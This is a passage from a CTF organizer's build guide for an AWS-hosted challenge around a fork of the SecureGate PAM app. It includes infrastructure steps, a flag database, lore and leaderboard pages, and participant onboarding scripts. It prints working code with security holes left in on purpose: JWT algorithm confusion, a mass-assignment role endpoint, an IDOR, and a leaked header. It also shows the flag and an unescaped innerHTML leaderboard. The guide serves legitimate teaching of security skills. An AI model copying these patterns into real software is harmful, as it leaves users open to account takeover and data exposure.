- Inbound: Port 80 from 0.0.0.0/0
- Outbound: All traffic

**Step 5 — Generate SSH Key Pairs**

Generate one key pair for team management access to all EC2s:
- AWS Console → EC2 → Key Pairs → Create Key Pair
- Name: `ctf-team-key`
- Type: ED25519
- Format: `.pem`
- Download and store securely — share between team members over Signal, not email

**Step 6 — Launch EC2 Instances**

Launch CTF-PAM EC2:
- AMI: Ubuntu 22.04 LTS (64-bit x86)
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-public-subnet`
- Auto-assign public IP: Enabled
- Security Group: `SG-CTF-PAM`
- Key pair: `ctf-team-key`
- Storage: 20 GB gp3
- Name tag: `CTF-PAM`

Launch CTF-MySQL EC2:
- AMI: Ubuntu 22.04 LTS
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-private-subnet`
- Auto-assign public IP: **Disabled**
- Security Group: `SG-CTF-MySQL`
- Key pair: `ctf-team-key`
- Storage: 8 GB gp3
- Name tag: `CTF-MySQL`

Launch Lore-Nginx EC2:
- AMI: Ubuntu 22.04 LTS
- Instance type: t2.micro
- Network: `securegate-ctf-vpc`, Subnet: `ctf-public-subnet`
- Auto-assign public IP: Enabled
- Security Group: `SG-Lore-Nginx`
- Key pair: `ctf-team-key`
- Storage: 8 GB gp3
- Name tag: `Lore-Nginx`

> [!info] Reaching the CTF-MySQL EC2
> The CTF-MySQL EC2 has no public IP. Team members cannot SSH into it directly from their laptops. To reach it for setup, SSH into the CTF-PAM EC2 first, then SSH from there to the CTF-MySQL private IP. This is called a **jump host** or **bastion** pattern. Command: `ssh -J ubuntu@<ctf-pam-public-ip> ubuntu@10.0.1.50`

**Step 7 — DuckDNS Setup**

Register two subdomains at `duckdns.org`:
- `ctf-pam` → CTF-PAM EC2 public IP
- `apt-lore` → Lore-Nginx EC2 public IP

Install cron job on both public EC2s:

```bash
# Run on both CTF-PAM and Lore-Nginx
echo "*/5 * * * * root curl -s 'https://www.duckdns.org/update?domains=<subdomain>&token=<your-token>&ip=' > /tmp/duckdns.log 2>&1" | sudo tee /etc/cron.d/duckdns
sudo chmod 644 /etc/cron.d/duckdns
```

Verify within 5 minutes: `nslookup ctf-pam.duckdns.org` should return the EC2's public IP.

**Step 8 — Install Base Software on All EC2s**

Run on CTF-PAM EC2:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y docker.io docker-compose-v2 nginx certbot python3-certbot-nginx git curl
sudo usermod -aG docker ubuntu
sudo systemctl enable nginx
sudo systemctl enable docker
```

Run on Lore-Nginx EC2:

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y nginx curl
sudo systemctl enable nginx
```

Run on CTF-MySQL EC2 (via jump host):

```bash
sudo apt update && sudo apt upgrade -y
sudo apt install -y mysql-server openssh-server
sudo systemctl enable mysql
sudo systemctl enable ssh
```

### Phase 0 Deliverables

- [ ] VPC, two subnets, Internet Gateway, route tables configured
- [ ] Three Security Groups created with initial rules
- [ ] All three CTF EC2 instances running and reachable via SSH
- [ ] `ctf-pam.duckdns.org` resolves to CTF-PAM public IP
- [ ] `apt-lore.duckdns.org` resolves to Lore-Nginx public IP
- [ ] DuckDNS cron job installed on both public EC2s
- [ ] Base software installed on all three instances
- [ ] All three members can SSH into CTF-PAM and Lore-Nginx directly, and into CTF-MySQL via jump host

---

## 10. Phase 1 — CTF PAM Fork & Vulnerability Injection (Member 2)

### Purpose

Create the intentionally vulnerable version of SecureGate PAM and deploy it to the CTF-PAM EC2. This is the core of the CTF — every challenge stage depends on vulnerabilities living here.

### Step 1 — Fork the Repository

```bash
# On Member 2's local machine
git clone https://github.com/MuhammadAbdullahSalahuddin/SecureGate ctf-pam
cd ctf-pam
git remote set-url origin https://github.com/<your-org>/ctf-pam
git push -u origin main
```

Create a `ctf/vulnerable` branch — all vulnerability injections happen here, never on `main`:

```bash
git checkout -b ctf/vulnerable
```

### Step 2 — Inject Vulnerability 1: Algorithm Confusion in `lib/auth.ts`

Replace the `verifyAccessToken` function with a version that accepts both RS256 and HS256:

```typescript
// VULNERABLE version — for CTF use only
// This allows HS256 tokens signed with the RSA public key to be accepted
export async function verifyAccessToken(token: string) {
  // Decode the header without verification to get the algorithm
  const [headerB64] = token.split('.');
  const header = JSON.parse(Buffer.from(headerB64, 'base64url').toString());
  const alg = header.alg ?? 'RS256';

  if (alg === 'HS256') {
    // VULNERABLE: use the RSA public key as an HMAC secret
    // An attacker who has the public key (from /jwks.json) can forge tokens
    const publicKeyStr = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
    const secret = new TextEncoder().encode(publicKeyStr);
    const { payload } = await jwtVerify(token, secret);
    return payload;
  } else {
    // Normal RS256 path (for legitimate user tokens)
    const publicKey = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
    const key = await importSPKI(formatPublicKey(publicKey), 'RS256');
    const { payload } = await jwtVerify(token, key);
    return payload;
  }
}
```

### Step 3 — Inject Vulnerability 2: JWKS Endpoint in `/app/api/.well-known/jwks.json/route.ts`

Create a new route that exposes the RSA public key in standard JWKS format:

```typescript
import { NextResponse } from 'next/server';
import { importSPKI, exportJWK } from 'jose';

export async function GET() {
  const publicKeyPem = process.env.GUARDIAN_JWT_PUBLIC_KEY ?? '';
  const key = await importSPKI(publicKeyPem, 'RS256');
  const jwk = await exportJWK(key);

  return NextResponse.json({
    keys: [{
      ...jwk,
      use: 'sig',
      alg: 'RS256',
      kid: 'securegate-2025',
    }],
  });
}
```

### Step 4 — Inject Vulnerability 3: Mass Assignment in `/app/api/register/route.ts`

Create a new unauthenticated registration endpoint:

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { pool } from '@/lib/db';
import bcrypt from 'bcrypt';

export async function POST(request: NextRequest) {
  const body = await request.json();
  // VULNERABLE: role is taken directly from client-controlled input
  const { email, password, role } = body;

  if (!email || !password) {
    return NextResponse.json({ message: 'Email and password required' }, { status: 400 });
  }

  // Only basic password length check — no role validation
  if (password.length < 6) {
    return NextResponse.json({ message: 'Password too short' }, { status: 400 });
  }

  const existing = await pool.query(`SELECT id FROM users WHERE email = $1`, [email]);
  if (existing.rows.length > 0) {
    return NextResponse.json({ message: 'Email already registered' }, { status: 409 });
  }

  const passwordHash = await bcrypt.hash(password, 12);
  const client = await pool.connect();
  try {
    await client.query('BEGIN');
    const userResult = await client.query(
      `INSERT INTO users (email, password_hash) VALUES ($1, $2) RETURNING id`,
      [email, passwordHash]
    );
    // VULNERABLE: role from body is used directly without validation
    const finalRole = role ?? 'OPERATOR';
    await client.query(
      `INSERT INTO user_roles (user_id, role_id)
       SELECT $1, r.id FROM roles r WHERE r.name = $2`,
      [userResult.rows[0].id, finalRole]
    );
    await client.query('COMMIT');
    return NextResponse.json({ message: 'Account created. Please log in.' }, { status: 201 });
  } catch {
    await client.query('ROLLBACK');
    return NextResponse.json({ message: 'Registration failed' }, { status: 500 });
  } finally {
    client.release();
  }
}
```

### Step 5 — Inject Vulnerability 4: IDOR in `/app/api/audit/sessions/user/[uid]/route.ts`

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { requireRole } from '@/lib/rbac';
import { getAuditDb } from '@/lib/mongo';

export async function GET(
  request: NextRequest,
  { params }: { params: Promise<{ uid: string }> }
) {
  // Auth check exists — but does not enforce that uid matches the caller
  const auth = await requireRole(request, ['ADMIN', 'OPERATOR', 'AUDITOR']);
  if (auth instanceof NextResponse) return auth;

  const { uid } = await params;
  // VULNERABLE: uid from URL is used directly — any authenticated user can
  // request any other user's sessions by changing the uid parameter
  const db = await getAuditDb();
  const sessions = await db.collection('audit_events')
    .aggregate([
      { $match: { type: { $in: ['session_start', 'session_end'] }, userId: uid } },
      {
        $group: {
          _id: '$sessionId',
          sessionId: { $first: '$sessionId' },
          startedAt: { $min: '$timestamp' },
          endedAt: { $max: { $cond: [{ $eq: ['$type', 'session_end'] }, '$timestamp', null] } },
        }
      },
      { $sort: { startedAt: -1 } },
    ]).toArray();

  return NextResponse.json({ sessions, userId: uid });
}
```

### Step 6 — Add Flag Submission Endpoint `/app/api/ctf/submit/route.ts`

```typescript
import { NextRequest, NextResponse } from 'next/server';
import { getAuditDb } from '@/lib/mongo';

const CORRECT_FLAG = process.env.CTF_FLAG ?? 'CTF{jwt_alg_confusion_pam_pwned_2025}';
const SUBMIT_KEY   = process.env.CTF_SUBMIT_KEY ?? '';

export async function POST(request: NextRequest) {
  // Prevent direct API abuse — submission form embeds this key
  const submitKey = request.headers.get('X-CTF-Submit-Key');
  if (!submitKey || submitKey !== SUBMIT_KEY) {
    return NextResponse.json({ message: 'Forbidden' }, { status: 403 });
  }

  const { flag, email } = await request.json();
  if (!flag || !email) {
    return NextResponse.json({ message: 'flag and email required' }, { status: 400 });
  }

  const db = await getAuditDb();
  const existing = await db.collection('ctf_scores').findOne({ email });
  if (existing) {
    return NextResponse.json({ message: 'Already submitted', alreadySolved: true });
  }

  if (flag.trim() !== CORRECT_FLAG) {
    return NextResponse.json({ message: 'Incorrect flag', correct: false });
  }

  await db.collection('ctf_scores').insertOne({
    email,
    flag,
    solvedAt: new Date(),
    points: 100,
  });

  return NextResponse.json({ message: 'Correct! Flag accepted.', correct: true });
}

export async function GET(request: NextRequest) {
  // Public scores endpoint — leaderboard polls this
  const db = await getAuditDb();
  const scores = await db.collection('ctf_scores')
    .find({})
    .sort({ points: -1, solvedAt: 1 })
    .toArray();
  return NextResponse.json({ scores });
}
```

### Step 7 — Modify Nginx Config to Leave Headers Intact

On CTF-PAM EC2, edit the Nginx config to NOT strip `X-Powered-By`:

```nginx
# /etc/nginx/sites-available/ctf-pam
server {
    listen 80;
    server_name ctf-pam.duckdns.org;

    # Deliberately NOT adding: proxy_hide_header X-Powered-By;
    # The header leaks "Next.js" to players — this is intentional for Stage 1

    location / {
        proxy_pass         http://localhost:3000;
        proxy_http_version 1.1;
        proxy_set_header   Upgrade $http_upgrade;
        proxy_set_header   Connection "upgrade";
        proxy_set_header   Host $host;
        proxy_read_timeout 3600s;
        proxy_send_timeout 3600s;
    }
}
```

### Step 8 — Update `.env` for CTF

Add CTF-specific variables to `.env` on CTF-PAM EC2:

```bash
# CTF-specific additions to .env
GUARDIAN_TARGET_HOST=10.0.1.50   # CTF-MySQL private IP (set by Member 3)
CTF_FLAG=CTF{jwt_alg_confusion_pam_pwned_2025}
CTF_SUBMIT_KEY=<random 32-byte hex generated at setup>
NODE_ENV=production
```

### Step 9 — Deploy to CTF-PAM EC2

```bash
# On CTF-PAM EC2
git clone https://github.com/<your-org>/ctf-pam /home/ubuntu/ctf-pam
cd /home/ubuntu/ctf-pam
cp .env.example .env
# Edit .env with production values
docker compose up -d --build
```

### Phase 1 Deliverables

- [ ] `ctf/vulnerable` branch contains all four vulnerability injections
- [ ] CTF PAM running on CTF-PAM EC2 (`http://ctf-pam.duckdns.org` loads)
- [ ] `/.well-known/jwks.json` returns a valid JWKS document
- [ ] `POST /api/register` with `role: "ADMIN"` creates an admin account
- [ ] Algorithm confusion attack verified: a token signed with HS256 using the public key is accepted
- [ ] IDOR verified: OPERATOR can fetch another user's sessions via `/api/audit/sessions/user/<other-id>`
- [ ] Flag submission returns `correct: true` for the correct flag string
- [ ] `X-Powered-By: Next.js` appears in response headers

---

## 11. Phase 2 — Flag Database & MySQL EC2 (Member 3)

### Purpose

Configure the CTF-MySQL EC2 as the final target. It must have MySQL running with the flag, a `pamuser` SSH account, convincing decoy data, and zero internet access.

### Step 1 — Configure MySQL

Connect via jump host: `ssh -J ubuntu@<ctf-pam-ip> ubuntu@10.0.1.50`

```bash
sudo mysql_secure_installation
# Follow prompts: set root password, remove anonymous users, disable remote root login
```

Open MySQL as root:

```sql
-- Create the databases
CREATE DATABASE employees;
CREATE DATABASE hr_archive;
CREATE DATABASE financial_records;
CREATE DATABASE secret_ops;

-- Create the pamuser database account (for PAM auto-login)
CREATE USER 'pamuser'@'localhost' IDENTIFIED BY '<strong-password>';
GRANT SELECT ON employees.* TO 'pamuser'@'localhost';
GRANT SELECT ON hr_archive.* TO 'pamuser'@'localhost';
GRANT SELECT ON financial_records.* TO 'pamuser'@'localhost';
GRANT SELECT, INSERT ON secret_ops.* TO 'pamuser'@'localhost';
FLUSH PRIVILEGES;
```

### Step 2 — Create Decoy Data

```sql
-- employees database — realistic but fake
USE employees;
CREATE TABLE staff (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  full_name  VARCHAR(100),
  department VARCHAR(50),
  salary     DECIMAL(10,2),
  hire_date  DATE,
  ssn_last4  CHAR(4)
);

INSERT INTO staff (full_name, department, salary, hire_date, ssn_last4) VALUES
  ('Sarah Mitchell',    'Engineering',  95000.00, '2019-03-15', '4821'),
  ('James Okonkwo',    'Marketing',    72000.00, '2020-07-22', '3356'),
  ('Priya Sharma',     'Finance',      88000.00, '2018-11-30', '7743'),
  ('Carlos Mendez',    'Engineering', 102000.00, '2017-06-01', '9912'),
  ('Anna Kowalski',    'HR',           65000.00, '2021-01-10', '5581'),
  -- ... (add 20–30 more rows for realism)
  ('David Chen',       'Engineering', 115000.00, '2016-04-18', '2247');

-- hr_archive — old records to explore
USE hr_archive;
CREATE TABLE terminated_employees (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  full_name   VARCHAR(100),
  department  VARCHAR(50),
  termination_date DATE,
  reason      VARCHAR(255)
);

INSERT INTO terminated_employees VALUES
  (1, 'Robert Hayes',   'Sales',       '2022-08-15', 'Resignation'),
  (2, 'Mei Tanaka',     'Engineering', '2021-03-30', 'End of contract'),
  (3, 'Omar Al-Rashid', 'Finance',     '2023-01-05', 'Retirement');

-- financial_records — numbers that look sensitive
USE financial_records;
CREATE TABLE quarterly_revenue (
  id        INT AUTO_INCREMENT PRIMARY KEY,
  quarter   VARCHAR(10),
  year      INT,
  revenue   DECIMAL(15,2),
  expenses  DECIMAL(15,2)
);

INSERT INTO quarterly_revenue VALUES
  (1, 'Q1', 2023, 4250000.00, 3100000.00),
  (2, 'Q2', 2023, 5180000.00, 3450000.00),
  (3, 'Q3', 2023, 4820000.00, 3200000.00),
  (4, 'Q4', 2023, 6340000.00, 4100000.00);
```

### Step 3 — Create the Flag Table

```sql
USE secret_ops;

CREATE TABLE project_codenames (
  id          INT AUTO_INCREMENT PRIMARY KEY,
  codename    VARCHAR(50),
  description VARCHAR(255),
  clearance   VARCHAR(20)
);

INSERT INTO project_codenames VALUES
  (1, 'IRON VEIL',    'Network perimeter hardening initiative', 'SECRET'),
  (2, 'BLUE CURTAIN', 'Endpoint detection deployment',         'SECRET'),
  (3, 'ZINC MIRROR',  'Internal audit automation system',      'TOP SECRET');

CREATE TABLE access_tokens (
  id         INT AUTO_INCREMENT PRIMARY KEY,
  service    VARCHAR(100),
  token_hash VARCHAR(255),
  expires_at DATETIME
);

INSERT INTO access_tokens VALUES
  (1, 'internal-api',  SHA2('sup3r-s3cr3t-api-key', 256), '2025-12-31 23:59:59'),
  (2, 'backup-system', SHA2('bkp-k3y-2025',         256), '2025-06-30 23:59:59');

-- THE FLAG TABLE
CREATE TABLE flag (
  id    INT AUTO_INCREMENT PRIMARY KEY,
  value VARCHAR(255) NOT NULL
);

INSERT INTO flag VALUES (1, 'CTF{jwt_alg_confusion_pam_pwned_2025}');
```

### Step 4 — Create pamuser SSH Account

```bash
# On CTF-MySQL EC2
sudo adduser pamuser --disabled-password --gecos ""

# Generate ed25519 key pair FOR THE PAM TO USE
# This is done by Member 3, then the private key is given to Member 2
# for sealing into the CTF PAM vault
sudo -u pamuser ssh-keygen -t ed25519 -f /home/pamuser/.ssh/ctf_pam_key -N ""

# Install the public key as authorized
sudo mkdir -p /home/pamuser/.ssh
sudo cat /home/pamuser/.ssh/ctf_pam_key.pub >> /home/pamuser/.ssh/authorized_keys
sudo chmod 700 /home/pamuser/.ssh
sudo chmod 600 /home/pamuser/.ssh/authorized_keys
sudo chown -R pamuser:pamuser /home/pamuser/.ssh

# The PRIVATE key (/home/pamuser/.ssh/ctf_pam_key) goes to Member 2
# Copy it via: scp (over SSH) or paste over Signal — never email
```

### Step 5 — Restrict pamuser Shell Access

The `pamuser` account should be limited — players who get into the terminal should see MySQL, not a full bash shell where they can explore the entire OS.

```bash
# Create a restricted shell that auto-launches MySQL
sudo tee /usr/local/bin/pamshell.sh << 'EOF'
#!/bin/bash
# Restricted shell for pamuser — auto-connects to MySQL
# Player cannot escape to bash from here
mysql -u pamuser -p'<pamuser-mysql-password>' --prompt="mysql [ctf]> "
EOF
sudo chmod +x /usr/local/bin/pamshell.sh

# Set it as pamuser's shell
sudo usermod -s /usr/local/bin/pamshell.sh pamuser
```

> [!info] Why a Restricted Shell?
> If `pamuser` drops into a full bash shell, a determined player could read `/etc/passwd`, attempt privilege escalation to root, or explore parts of the system that are out of scope. The restricted shell ensures the session is scoped exactly to what Stage 4 requires — database exploration only. This is also realistic: real PAM systems restrict what operators can do even after granting access.

### Step 6 — Update the CTF PAM Vault Seed

Member 3 hands Member 2 the private key. Member 2 updates `docker/seed-vault.ts` in `ctf-pam`:

```typescript
// docker/seed-vault.ts in ctf-pam fork
const creds = {
  ssh: {
    username: 'pamuser',
    privateKey: `-----BEGIN OPENSSH PRIVATE KEY-----
<contents of ctf_pam_key>
-----END OPENSSH PRIVATE KEY-----`,
  },
  db: {
    username: 'pamuser',
    password: '<pamuser-mysql-password>',
  },
}
```

And `tunnel.service.ts` must use `privateKey` instead of `password` for SSH auth (because Ubuntu 22+ uses yescrypt which ssh2 does not support for password auth):

```typescript
conn.connect({
  host:       hostname,
  port:       port ?? 22,
  username:   creds.ssh.username,
  privateKey: creds.ssh.privateKey,  // ed25519 key, not password
  readyTimeout: 10000,
});
```

### Phase 2 Deliverables

- [ ] MySQL 8.0 running on CTF-MySQL EC2
- [ ] Four databases created: `employees`, `hr_archive`, `financial_records`, `secret_ops`
- [ ] Flag table populated: `select * from flag` returns `CTF{jwt_alg_confusion_pam_pwned_2025}`
- [ ] Decoy data in `employees`, `hr_archive`, `financial_records` is convincing (30+ rows)
- [ ] `pamuser` SSH account created with ed25519 key
- [ ] `pamuser` restricted shell auto-launches MySQL on login
- [ ] Private key delivered to Member 2 securely
- [ ] CTF PAM vault seeded with new key-based credentials
- [ ] SSH tunnel from CTF-PAM to CTF-MySQL verified: `ssh -i ctf_pam_key pamuser@10.0.1.50` opens MySQL

---

## 12. Phase 3 — Lore Page, Leaderboard & Nginx EC2 (Member 1)

### Purpose

Build and deploy the static lore site. This is what players see first. It must communicate the scenario convincingly, provide the starting URL, accept flag submissions, and show the live leaderboard.

### Step 1 — Write the Lore Page (`index.html`)

The tone is corporate-professional with subtle signs that "APT Solutions" is fictional. The page must include:

- Company logo (SVG — a stylised lock with "APT Solutions" text)
- The narrative paragraph (see below)
- A clear "Engagement Scope" section listing what is in-scope and out-of-scope
- The target URL as a clickable link: `http://ctf-pam.duckdns.org`
- Navigation to `/leaderboard.html` and `/submit.html`

**Narrative text (adapt as needed):**

> APT Solutions is a mid-sized consulting firm whose internal infrastructure has been flagged by external auditors for critical misconfigurations. The firm recently deployed a Privileged Access Management portal — SecureGate — to protect their employee database server. Preliminary OSINT suggests the portal may contain exploitable vulnerabilities in its authentication and access control layers.
>
> You have been engaged under a time-limited penetration testing contract. Your objective is to gain administrative access to the PAM portal, establish a proxied session to the target database, and retrieve the flag from the `secret_ops` database to confirm the breach scope.
>
> **Target:** `http://ctf-pam.duckdns.org`
> **Starting credentials:** Provided in your onboarding email.

### Step 2 — Leaderboard Page (`leaderboard.html`)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>APT Solutions — CTF Leaderboard</title>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <div class="container">
    <h1>🏆 Leaderboard</h1>
    <p class="subtitle">Updates every 10 seconds</p>
    <div id="board"></div>
  </div>
  <script src="/assets/leaderboard.js"></script>
</body>
</html>
```

`leaderboard.js`:

```javascript
async function refresh() {
  try {
    const res  = await fetch('https://ctf-pam.duckdns.org/api/ctf/scores');
    const data = await res.json();
    const board = document.getElementById('board');

    if (!data.scores || data.scores.length === 0) {
      board.innerHTML = '<p class="empty">No solves yet. Be the first.</p>';
      return;
    }

    board.innerHTML = data.scores.map((s, i) => `
      <div class="row ${i === 0 ? 'first' : ''}">
        <span class="rank">#${i + 1}</span>
        <span class="email">${s.email}</span>
        <span class="points">${s.points} pts</span>
        <span class="time">${new Date(s.solvedAt).toLocaleTimeString()}</span>
      </div>
    `).join('');
  } catch {
    document.getElementById('board').innerHTML = '<p class="error">Unable to reach scoring server.</p>';
  }
}

refresh();
setInterval(refresh, 10_000);
```

### Step 3 — Flag Submission Page (`submit.html`)

```html
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>APT Solutions — Submit Flag</title>
  <link rel="stylesheet" href="/assets/style.css">
</head>
<body>
  <div class="container">
    <h1>Submit Flag</h1>
    <div id="form-area">
      <input type="email" id="email" placeholder="Your email address" />
      <input type="text"  id="flag"  placeholder="CTF{...}" />
      <button onclick="submit()">Submit</button>
    </div>
    <div id="result"></div>
  </div>
  <script>
    const SUBMIT_KEY = '<CTF_SUBMIT_KEY value — hardcoded at deploy time>';

    async function submit() {
      const email = document.getElementById('email').value.trim();
      const flag  = document.getElementById('flag').value.trim();
      if (!email || !flag) { alert('Both fields required'); return; }

      const res = await fetch('https://ctf-pam.duckdns.org/api/ctf/submit', {
        method:  'POST',
        headers: {
          'Content-Type':    'application/json',
          'X-CTF-Submit-Key': SUBMIT_KEY,
        },
        body: JSON.stringify({ flag, email }),
      });
      const data = await res.json();
      document.getElementById('result').textContent = data.message;
    }
  </script>
</body>
</html>
```

### Step 4 — CSS (`style.css`)

Dark, terminal aesthetic — monospace fonts, dark background, green accents. Keep it minimal: the lore should feel like a real corporate security portal, not a flashy game site.

```css
* { box-sizing: border-box; margin: 0; padding: 0; }

body {
  background: #0d0d0d;
  color: #c8c8c8;
  font-family: 'Courier New', Courier, monospace;
  min-height: 100vh;
  display: flex;
  align-items: flex-start;
  justify-content: center;
  padding: 40px 20px;
}

.container {
  max-width: 720px;
  width: 100%;
}

h1 {
  color: #00ff88;
  font-size: 1.8rem;
  margin-bottom: 8px;
  letter-spacing: 2px;
}

.subtitle {
  color: #666;
  font-size: 0.85rem;
  margin-bottom: 24px;
}

.row {
  display: flex;
  gap: 16px;
  padding: 10px 12px;
  border-bottom: 1px solid #1e1e1e;
  align-items: center;
}

.row.first { color: #00ff88; border-left: 3px solid #00ff88; }

.rank   { width: 40px; color: #666; }
.email  { flex: 1; }
.points { width: 80px; text-align: right; }
.time   { width: 100px; color: #666; font-size: 0.8rem; }

input {
  width: 100%;
  padding: 10px;
  margin-bottom: 12px;
  background: #1a1a1a;
  border: 1px solid #333;
  color: #c8c8c8;
  font-family: inherit;
  border-radius: 4px;
}

button {
  padding: 10px 24px;
  background: #00ff88;
  color: #0d0d0d;
  border: none;
  font-family: inherit;
  font-weight: bold;
  cursor: pointer;
  border-radius: 4px;
}

button:hover { background: #00cc66; }
```

### Step 5 — Nginx Config on Lore EC2

```nginx
# /etc/nginx/sites-available/apt-lore
server {
    listen 80;
    server_name apt-lore.duckdns.org;

    root /var/www/apt-lore;
    index index.html;

    # Deliberately add a breadcrumb header for Stage 1
    add_header X-Challenge-Platform "SecureGate-PAM" always;

    location / {
        try_files $uri $uri/ =404;
    }
}
```

```bash
sudo ln -s /etc/nginx/sites-available/apt-lore /etc/nginx/sites-enabled/
sudo rm -f /etc/nginx/sites-enabled/default
sudo nginx -t && sudo systemctl reload nginx
```

### Step 6 — Deploy Script

```bash
#!/usr/bin/env bash
# deploy.sh — run from ctf-lore/ directory
EC2_USER=ubuntu
EC2_IP=<lore-nginx-ec2-public-ip>
KEY=~/.ssh/ctf-team-key.pem

rsync -avz --delete \
  -e "ssh -i $KEY" \
  ./public/ \
  $EC2_USER@$EC2_IP:/var/www/apt-lore/

echo "Deploy complete."
```

### Phase 3 Deliverables

- [ ] `apt-lore.duckdns.org` loads the lore page
- [ ] `X-Challenge-Platform: SecureGate-PAM` header visible in `curl -I` response
- [ ] Leaderboard page polls `/api/ctf/scores` and renders table
- [ ] Submit page sends flag to `/api/ctf/submit` with correct `X-CTF-Submit-Key`
- [ ] Correct flag submission updates leaderboard within 10 seconds
- [ ] Incorrect flag returns "Incorrect flag" without breaking anything

---

## 13. Phase 4 — Onboarding Pipeline & Participant Accounts (Member 2)

### Purpose

Create all 24 participant accounts before the event. Accounts must be seeded into the CTF PAM's PostgreSQL with OPERATOR role and their credentials delivered via a themed email.

### Step 1 — Google Form

Create a Google Form at least one week before the event:
- Fields: Full Name, Email Address, Preferred CTF Username
- Responses go to a Google Sheet
- Export the sheet as `participants.csv` the day before the event

CSV format expected:
```
name,email,username
Alice Tanveer,alice@student.comsats.edu.pk,0xAlice
Bob Rafiq,bob@student.comsats.edu.pk,n3tw0rkBob
...
```

### Step 2 — Bulk Account Creation Script (`ctf-ops/onboarding/bulk-create-users.ts`)

This script reads `participants.csv`, generates a random password for each participant, calls the CTF PAM's `POST /api/users/admin` endpoint (authenticated as admin) to create the account, and saves the generated credentials to `credentials.csv`.

```typescript
import { parse } from 'csv-parse/sync';
import { randomBytes } from 'crypto';
import { readFileSync, writeFileSync } from 'fs';

const CTF_PAM_URL = 'http://ctf-pam.duckdns.org';
const ADMIN_TOKEN = process.env.ADMIN_JWT ?? ''; // pre-generated admin JWT

interface Participant { name: string; email: string; username: string }

async function main() {
  const csv = readFileSync('./participants.csv', 'utf8');
  const participants: Participant[] = parse(csv, { columns: true, skip_empty_lines: true });

  const credentials: string[] = ['name,email,password,ctf_url'];

  for (const p of participants) {
    // Generate a memorable but random password: adjective-noun-4digits
    const password = randomBytes(8).toString('hex'); // 16-char hex for security

    const res = await fetch(`${CTF_PAM_URL}/api/users/admin`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        Authorization:  `Bearer ${ADMIN_TOKEN}`,
      },
      body: JSON.stringify({
        email:    p.email,
        password: password,
        role:     'OPERATOR',
      }),
    });

    if (!res.ok) {
      const err = await res.json();
      console.error(`Failed to create ${p.email}:`, err.message);
      continue;
    }

    credentials.push(`${p.name},${p.email},${password},${CTF_PAM_URL}`);
    console.log(`Created: ${p.email}`);
    await new Promise(r => setTimeout(r, 200)); // rate limit
  }

  writeFileSync('./credentials.csv', credentials.join('\n'));
  console.log('Done. Credentials saved to credentials.csv');
}

main().catch(console.error);
```

### Step 3 — Email Template (`email-template.html`)

```html
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <style>
    body   { font-family: 'Courier New', monospace; background: #0d0d0d; color: #c8c8c8; padding: 24px; }
    .card  { max-width: 520px; margin: auto; border: 1px solid #333; padding: 32px; border-radius: 8px; }
    h1     { color: #00ff88; font-size: 1.2rem; margin-bottom: 16px; }
    .cred  { background: #1a1a1a; padding: 16px; border-radius: 4px; margin: 12px 0; }
    .label { color: #666; font-size: 0.8rem; }
    .value { color: #00ff88; font-size: 1rem; margin: 4px 0 12px; }
    .note  { font-size: 0.8rem; color: #666; margin-top: 24px; }
  </style>
</head>
<body>
  <div class="card">
    <h1>// APT Solutions — CTF Engagement Brief</h1>
    <p>Your penetration testing credentials have been provisioned. The engagement window opens at <strong>{{EVENT_TIME}}</strong>.</p>

    <div class="cred">
      <div class="label">PORTAL URL</div>
      <div class="value">http://ctf-pam.duckdns.org</div>
      <div class="label">EMAIL</div>
      <div class="value">{{EMAIL}}</div>
      <div class="label">PASSWORD</div>
      <div class="value">{{PASSWORD}}</div>
    </div>

    <p>Begin at the lore page: <strong>http://apt-lore.duckdns.org</strong></p>
    <p>Join the Discord for announcements: <strong>{{DISCORD_INVITE}}</strong></p>

    <p class="note">
      These credentials are for the CTF engagement only.<br>
      Do not attempt to attack systems outside the defined scope.
    </p>
  </div>
</body>
</html>
```

### Step 4 — Send Emails (`send-emails.ts`)

Use Nodemailer with a Gmail app password or any SMTP provider:

```typescript
import nodemailer from 'nodemailer';
import { parse }  from 'csv-parse/sync';
import { readFileSync } from 'fs';

const transporter = nodemailer.createTransport({
  service: 'gmail',
  auth: {
    user: process.env.SMTP_USER,
    pass: process.env.SMTP_PASS, // App password, not account password
  },
});

const template = readFileSync('./email-template.html', 'utf8');
const creds = parse(readFileSync('./credentials.csv', 'utf8'), {
  columns: true, skip_empty_lines: true
});

for (const c of creds) {
  const html = template
    .replace('{{EMAIL}}',          c.email)
    .replace('{{PASSWORD}}',       c.password)
    .replace('{{EVENT_TIME}}',     'Saturday 14:00 PKT')
    .replace('{{DISCORD_INVITE}}', 'https://discord.gg/<your-invite>');

  await transporter.sendMail({
    from:    '"APT Solutions CTF" <noreply@yourdomain.com>',
    to:      c.email,
    subject: '[APT Solutions CTF] Your Engagement Credentials',
    html,
  });

  console.log(`Sent to ${c.email}`);
  await new Promise(r => setTimeout(r, 500)); // avoid spam filters
}
```

### Phase 4 Deliverables

- [ ] Google Form published and shared with all participants
- [ ] `participants.csv` collected the day before the event
- [ ] `bulk-create-users.ts` run — all 24 accounts exist in CTF PAM PostgreSQL
- [ ] `credentials.csv` generated and stored securely (not committed to git)
- [ ] All 24 credential emails sent successfully
- [ ] Test login verified: one credential from the CSV opens the dashboard

---

## 14. Phase 5 — Hardening, Isolation & Security Groups (Member 3)

### Purpose

Before the event goes live, lock down everything that should not be reachable. The CTF PAM being intentionally vulnerable does not mean the team's SSH access or the Production PAM should also be at risk.

### Step 1 — Lock SSH on All EC2s

By default, SSH is open to `0.0.0.0/0` in early development. Before the event, SSH inbound must be restricted to **only team members' current IP addresses**. Each team member updates the Security Group with their current home IP.

If team members have dynamic ISP IPs, use a VPN with a static exit IP or update the rules on event day.

```bash
